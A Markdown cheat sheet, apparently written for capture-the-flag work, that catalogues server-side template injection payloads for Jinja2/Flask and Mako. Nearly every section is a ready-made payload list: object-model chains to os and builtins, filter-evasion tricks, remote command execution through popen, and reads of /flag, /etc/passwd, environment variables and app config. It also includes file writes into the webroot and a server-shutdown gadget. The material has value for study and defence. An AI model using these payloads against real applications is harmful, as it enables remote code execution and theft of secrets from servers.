# Python object-model deep reference — Jinja2/Mako escapes

Every path from a template expression to `os`/`__builtins__`/
file-RW/RCE. The walk always ends at `__globals__` or
`__subclasses__` — the question is which object gets you there
with the least filter-surface.

---

## 1. The reach-map — what object → what's reachable

```text
any object ──.── __class__ ──→ class object ──.── __mro__ / __base__
                                            └── __init__ ──→ function
                                                        └── __globals__

function ──.── __globals__ ──→ its module's namespace dict
         └── __builtins__ ──→ builtins module/dict → open/eval/import

class ──.── __subclasses__() ──→ every loaded subclass
      └── __init__ ──→ __init__.__globals__

module ──.── __dict__ ──→ module namespace
```

`__globals__` on a function gives the MODULE's namespace — if that
module imported `os`, you get `os` without hunting subclasses.

---

## 2. The bound-object catalog — who exposes `__globals__`

Flask templates bind helpers — each is a function with globals:

| Object | `__globals__` contains | Notes |
|---|---|---|
| `lipsum` | `os`, `__builtins__`, `range`, `Markup` | the #1 |
| `cycler` | `os`? — actually `Markup`+`joiner` — has `__init__` | via `.__init__.__globals__` |
| `joiner` | same — `.__init__.__globals__` | class instance |
| `namespace` | same | class instance |
| `url_for` | `os`? — the flask module's globals — has `current_app` | huge win: `url_for.__globals__.current_app.config` |
| `get_flashed_messages` | flask.helpers globals → `__builtins__` | |
| `get_template_attribute` | same | |
| `dict` `range` `lipsum` `cycler` `joiner` `namespace` | jinja defaults | jinja's own globals — `os` may be absent — check |
| `self` | `_TemplateReference__context` → the context | not a function — the CONTEXT |
| `config` | the Config obj — `from_pyfile` method → file-read! | |
| `request` | request object — `.application` → WSGI app → `__globals__` | |
| `session` | session dict — contents leak | |
| `g` | app-context globals | |
| `app` | if bound — `.config`, `.jinja_env` | |

The critical spread: `url_for.__globals__.current_app.config` —
url_for's module is flask.helpers which imports `current_app` →
the LIVE app's config → flag/secret.

---

## 3. The `__subclasses__` hunting — index maps

```jinja2
{%for c in ''.__class__.__mro__[1].__subclasses__()%}
{{loop.index}} {{c.__name__}} {{c.__module__}}
{%endfor%}
```

Classes worth hunting (by name):

```text
subprocess.Popen              — direct exec
os._wrap_close                — has .system/.popen via __init__.__globals__
warnings.catch_warnings        — __init__.__globals__ has __builtins__
_frozen_importlib.BuiltinImporter — has builtins
type                           — the metaclass — subclasses() again!
FileLoader/Loader classes      — file read
zipimport.zipimporter          — archive read
socket._socketobject           — socket → HTTP exfil raw
multiprocessing.*              — process-spawn gadgets
codecs.Codec                   — decode tricks
```

The `.catch_warnings` chain — the most reliable non-os path:

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__']}}
   → the builtins dict → ['eval'](code) / ['open'](path).read() /
     ['__import__']('os')
```

`__builtins__` can be a MODULE or a DICT depending on context —
try both `['eval']` and `.eval`.

---

## 4. No-subclasses paths — when the list is empty/blocked

```jinja2
{{lipsum.__globals__.os.popen('id').read()}}            -- direct
{{config.from_pyfile('/flag')}}                          -- Config read
{{url_for.__globals__.current_app.config}}               -- app config
{{request.application.__globals__.__builtins__.__import__('os')}}
{{self._TemplateReference__context}}                      -- full context
{{self.__init__.__globals__}}                              -- self IS a
                                                          bound method →
                                                          globals!
{{g.get('x')}}                                              -- g-object
{{app.config.from_pyfile('/flag')}}
{{app.jinja_env.globals}}                                   -- jinja globals
```

`self.__init__.__globals__` — `self` (TemplateReference) has an
`__init__` whose module globals contain everything Jinja imported.

---

## 5. The getattr/getitem/attr() alternate accessors

```jinja2
{{''['__class__']}}                    -- getitem
{{''|attr('__class__')}}               -- attr filter
{{getattr('', '__class__')}}           -- getattr — jinja globals
{{''.__getattribute__('__class__')}}   -- magic-method call
{{vars(x)}}                             -- vars() — module dict?
{{x.__dict__}}                          -- instance dict
{{''.__class__|attr('__mro__')}}
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{x|attr('__in'+'it__')}}
{{dict(__class__=x)|first}}             -- dict-key→string trick
```

The `|attr` filter does `getattr` — equivalent reach, different
syntax surface (dots gone). `__getattribute__` is the raw accessor.

---

## 6. String-building when quotes are filtered

```jinja2
{{request.args.x}}              &x=any-string     -- param-carried
{{request.values.x}}            -- GET+POST merged
{{request.cookies.x}}           -- cookie-carried
{{request.headers.x}}           -- header-carried
{{dict(k=v)|join}}               -- dict KEYS are strings
{{dict(__class__=x)|first}}      -- '__class__' from a key
{{'%c'|format(95)}}              -- chr() via format — '_'
{{'%s%s'|format(95,95)}}          -- format concat
{{lipsum|string|list}}           -- lipsum → char pool
{{self|string|list}}
{{url_for|string|list}}
{{config|string|list}}
```

`'%c'|format(N)` = chr(N) — build `__class__` as
`'%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115)` — ugly but
quote-free.

---

## 7. The `{% %}`-statement paths — when `{{}}` is gated

```jinja2
{%for i in range(5)%}{{i}}{%endfor%}
{%if 7*7==49%}T{%endif%}
{%set x=7*7%}{{x}}
{%set x='__cl'+'ass__'%}{{''[x]}}       -- concat in set
{%set f= lipsum.__globals__.os.popen%}{{f('id').read()}}
   -- assign the FUNCTION to a var then call!
{%set f=lipsum['__globals__']['os']['popen']%}{{f('id').read()}}
{%with x=lipsum.__globals__%}{{x.os.popen('id').read()}}{%endwith%}
{%print(lipsum.__globals__.os.popen('id').read())%}    -- {%print%}
```

`{%set f = EXPR %}{{ f('args') }}` — storing a callable in a var
then calling it — splits the dangerous part across delimiters.

---

## 8. The `__init__`/`__reduce__`/`__getattribute__` chains

```jinja2
{{x.__init__}}                    -- bound init → __globals__
{{x.__init__.__globals__}}
{{x.__class__.__init__.__globals__}}
{{x.__init__.__globals__['__builtins__']}}
{{x.__reduce__}}                  -- __reduce__ returns the
                                   pickle-protocol tuple — rarely
                                   exploitable but exposes internals
{{x.__getattribute__}}            -- the accessor itself
{{x.__getattribute__('__class__')}}
{{x.__getattribute__('__cl'+'ass__')}}
```

---

## 9. The `import` chains — reaching modules

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{__import__('os')}}                 -- if __import__ bound (Mako!)
{{lipsum.__globals__['__import__']}} -- if module imported it
{{url_for.__globals__.sys.modules}}  -- LOADED modules — find os!
{{lipsum.__globals__.sys.modules['os'].popen('id').read()}}
   -- sys.modules is the loaded-module dict — os is usually there
```

`sys.modules` — every module the app has loaded is in there —
no import needed, just lookup:

```jinja2
{{lipsum.__globals__.sys.modules['os'].popen('id').read()}}
{{lipsum.__globals__.sys.modules['subprocess'].check_output('id',shell=True)}}
{{lipsum.__globals__.sys.modules['jinja2'].nodes}}
```

---

## 10. The os-submodule reach — os.popen/os.system/os.listdir

```jinja2
{{os.popen('id').read()}}
{{os.system('id')}}                     -- returns code not output —
                                        needs redirect to file
{{os.system('cat /flag > /tmp/x')}}
{{os.listdir('/')}}
{{os.environ}}                          -- env vars — FLAG often here!
{{os.environ['FLAG']}}
{{os.open('/flag',0)}}                  -- fd — then os.read
{{os.read(os.open('/flag',0),1024)}}
{{os.popen('cat /flag').read()}}
{{os.path}} {{os.getcwd()}}
{{os.urandom(4)}}                       -- rng probe
```

`os.environ` is the highest-value single read — flag env-vars are
the CTF norm.

---

## 11. The file-write paths

```jinja2
{{lipsum.__globals__.__builtins__.open('/tmp/x','w').write('shell')}}
{{lipsum.__globals__.os.system('cp /flag /tmp/pub/flag')}}
{{lipsum.__globals__.os.system('cat /flag > /static/x.txt')}}
   -- into a served dir → GET /static/x.txt → read the flag
```

The write-to-webroot trick converts blind → reflected.

---

## 12. The `config.from_pyfile` trick — Config as reader

```jinja2
{{config.from_pyfile('/flag')}}
{{config.from_pyfile('/etc/passwd')}}
{{config.from_pyfile('/flag') and config.get('FLAG')}}
   -- from_pyfile executes the file as python-like config —
      NON-python files error, but the error text may leak content;
      files that ARE python-syntax assign keys → then {{config.KEY}}
{{config.from_pyfile('/app/config.py')}}
{{config.items()}}
```

---

## 13. The `request.application` chain — WSGI reach

```jinja2
{{request.application}}
{{request.application.__globals__}}
{{request.application.__globals__.__builtins__}}
{{request.application.__globals__.__builtins__.open('/flag').read()}}
{{request.application.__globals__['os'].popen('id').read()}}
{{request.application.__call__}}
{{request.environ}}
{{request.environ['werkzeug.server.shutdown']}}   -- shutdown gadget
```

`request.application` is the WSGI callable — a function →
`__globals__` → the app's whole namespace.

---

## 14. The eval/exec builtins — direct code

```jinja2
{{lipsum.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}
{{lipsum.__globals__.__builtins__['eval']('__import__("os").popen("id").read()')}}
{{lipsum.__globals__.__builtins__.exec('import os;os.system("id")')}}
{{request.args.f(request.args.a)}}&f=eval&a=__import__("os").popen("id").read()
```

---

## 15. Full-payload examples — the endgames

```jinja2
{# the 'no subclasses no quotes no __' nightmare chain: #}
{{request|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(request.args.e)}}&a=application&b=__globals__&c=items&d=get&e=os
   -- walks request.application.__globals__.items() — too many
      steps; the realistic version:

{{lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.d)()}}
   &a=__globals__&b=__getitem__&c=os&d=popen ... still needs the
   read() call — layer request.args for method names AND args:

{{lipsum[request.args.g][request.args.o][request.args.p](request.args.c)[request.args.r]()}}
   &g=__globals__&o=os&p=popen&c=id&r=read
   → lipsum.__globals__['os']['popen']('id').read() — every string
     arrived via params — payload has zero quotes/keywords
```
